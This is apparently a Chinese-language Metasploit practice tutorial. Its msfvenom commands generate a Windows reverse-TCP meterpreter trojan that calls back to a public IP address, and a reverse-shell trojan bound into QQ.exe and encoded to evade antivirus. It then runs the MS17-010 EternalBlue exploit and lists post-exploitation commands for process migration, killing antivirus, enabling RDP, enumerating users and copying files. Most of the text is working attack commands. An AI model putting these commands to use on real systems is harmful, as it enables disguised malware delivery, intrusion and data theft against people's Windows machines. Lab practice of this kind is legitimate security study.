# msfvenom练习

msfvenom是msfpayload,msfencode的结合体,它的优点是单一,命令行,和效率.利用msfvenom生成木马程序,并在目标机上执行,在本地监听上线

## 1、生成exe木马

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=124.223.192.250 LPORT=4444 -f exe -o 123.exe
```

212.129.238.18是攻击者的监听机器，4444是被攻击机器监听端口

### 开启kali监听

启动msfconsole

![image-20220317151928134](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/e6c9d24ely1h0cwlr427jj20hg0gkta3.jpg)

#### 开启监听

```
use exploit/multi/handler
```



#### 设置tcp监听

```
set payload windows/meterpreter/reverse_tcp

set lhost 124.223.192.250
```

![image-20220317152306277](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/e6c9d24ely1h0cwpjmmdoj20uk0e640c.jpg)



#### 输入explore开始监听

### 木马上线

当被攻击的机器（我的是windows xp）点击生成的123.exe木马时，即可以监听到木马上线

![image-20220317152638860](/Users/oo/Library/Application Support/typora-user-images/image-20220317152638860.png)

查看系统信息

![image-20220317134219094](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/e6c9d24ely1h0ctsnxma7j20zs08caaq.jpg)

查看系统截图

![image-20220317134233725](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/e6c9d24ely1h0ctsy65qqj217v0u0wjd.jpg)

等等可以一系列后渗透操作。。

### msf绑定软件做木马

msf也可以绑定正常软件运行，在用户看来软件正常运行，但是这个软件后台同时偷偷启动木马程序，就拿一个qq软件做例子

![木马模版](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/e6c9d24ely1h0cttfxjplj20ma0gpgoa.jpg)

将QQ.exe用作绑定木马

查看编码类型

```
msfvenom -l encoders
```

如图，有很多类型编码，我们选择x86/shikata_ga_nai 编码

![查看编码类型](https://img-blog.csdnimg.cn/20191022094918496.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhcWlhbmc1NTU=,size_16,color_FFFFFF,t_70)

#### 捆绑木马

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.110 LPORT=8080 -e x86/shikata_ga_nai -x /root/lenkee/share/QQ.exe -i 5 -f exe -o /root/lenkee/share/QQ1.exe
```

其中-i 5是进行5次编码，其目的是为了面杀作用，但是这样作用已经没用了，照样被杀。生成了QQ2.exe文件

#### 木马上线

##### 启动监听

![启动监听](https://img-blog.csdnimg.cn/20191022094937676.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhcWlhbmc1NTU=,size_16,color_FFFFFF,t_70)

exploit回车开始监听
将QQ2.exe文件拷贝回被攻击的机器，点击启动

![启动绑定木马软件](https://img-blog.csdnimg.cn/20191022095000189.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhcWlhbmc1NTU=,size_16,color_FFFFFF,t_70)

kali监听显示上线，但是在windows上的qq软件点击后却没有启动，不知道什么情况，有空研究一下
查看windows端口，发现8080后门端口被打开

![端口查看](https://img-blog.csdnimg.cn/20191022095026960.png)

## 2、ms17_010

```
 #进入msf
msfconsole

#数据库搜索ms17-010
search ms17-010

#进入漏洞
use windows/smb/ms17_010_eternalblue

#设置被攻击者的ip
set rhosts 192.168.5.59

#运行
run

#解决乱码
chcp 65001
```



### 搜索攻击载荷

```
search ms17_010
```

![image-20220317135133016](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/e6c9d24ely1h0cu2a1hocj21xs0cgn0o.jpg)

### 永恒之蓝攻击载荷

```
use 2
```

![image-20220317135219561](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/e6c9d24ely1h0cu32l6v1j20n604oaac.jpg)

### 配置的参数

```
options
```

![image-20220317135313535](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/e6c9d24ely1h0cu40f11zj21eo0jc77g.jpg)

#### 设置 目标ip

```
set RHOSTS 172.20.10.3
```

### run攻击

![](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/e6c9d24ely1h0cu6b557sj21bu0u0gtp.jpg)

### meterpreter后渗透

#### 1、ps 查看进程

![image-20220317150505812](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/e6c9d24ely1h0cw6sl5ccj20mh0cktan.jpg)

#### 2、查看当前进程号

```
getpid
```

![image-20220317150602357](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/e6c9d24ely1h0cw7s4exvj205i01jt8j.jpg)

从ps查看的运行进程内找出meterpreter的ipd，可以看到，现在的进程为1104，name为svchost.exe，输入migrate 2844迁移至explorer.exe，因为该进程是一个稳定的应用，然后再使用getpid查看新的进程号

```
meterpreter > migrate 2844
 
[] Migrating from 1104 to 2844...
 
[] Migration completed successfully.
 
meterpreter > getpid
 
Current pid: 2844
 
meterpreter >
```

##### 自动化迁移：run post/windows/manage/migrate

#### 3、系统命令

##### 1）查看目标机的系统信息：sysinfo

![image-20220317150827141](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/e6c9d24ely1h0cwaahkemj20dq03qt8r.jpg)

##### 2)查看是否运行在虚拟机上：run post/windows/gather/checkvm

![image-20220317150900266](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/e6c9d24ely1h0cwav26ilj20bj021jrc.jpg)

##### 3)查看运行时间：idletime

![image-20220317150921640](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/e6c9d24ely1h0cwb8650aj208m00z744.jpg)

##### 4)查看当前权限：getuid

![image-20220317150945615](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/e6c9d24ely1h0cwbn7trcj208v01fdfo.jpg)

##### 5)关闭杀毒软件：run killav

![image-20220317151012770](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/e6c9d24ely1h0cwc4kc8yj20dx02v0sv.jpg)

##### 6)启动目标机的远程桌面协议RDP（3389）：run post/windows/manage/enable_rdp

![image-20220317151045604](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/e6c9d24ely1h0cwcovbfbj20nh03y3yx.jpg)

##### 7)查看多少用户登录目标机：run post/windows/gather/enum_logged_on_users

![image-20220317151137877](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/e6c9d24ely1h0cwdlhhxrj20lw0c7aaw.jpg)

##### 8)列举用户安装在系统上的应用程：run post/windows/gather/enum_applications

![image-20220317151204525](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/e6c9d24ely1h0cwe26yfkj20mh08z75c.jpg)

#### 4、文件系统命令

##### 1)查看当前属于目标机的工作目录的路径名称：pwd

![image-20220317151307788](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/e6c9d24ely1h0cwf5fu3aj2045011q2q.jpg)



##### 2)查看当前处于本地的哪个目录：getlwd

![image-20220317151400310](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/e6c9d24ely1h0cwg2bc8bj204900sa9u.jpg)

##### 3)列出当前目录的所有文件：ls

![image-20220317151455621](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/e6c9d24ely1h0cwh114rnj20g90h7dje.jpg)

##### 4)查看目标1.txt文件内内容：cat 1.txt



##### 5)搜寻、拷贝、上传文件至目标（需要拥有system权限，可以利用getsystem、MS16-032漏洞进行提权）

搜寻c盘内所有以txt为后缀的文件：`search -f *.txt -d c:\`

拷贝文件至kali内：`download c:\1.txt /root`
上传文件至win7C盘目录下：`upload /home/zidian/msfadmin.txt c:\ `

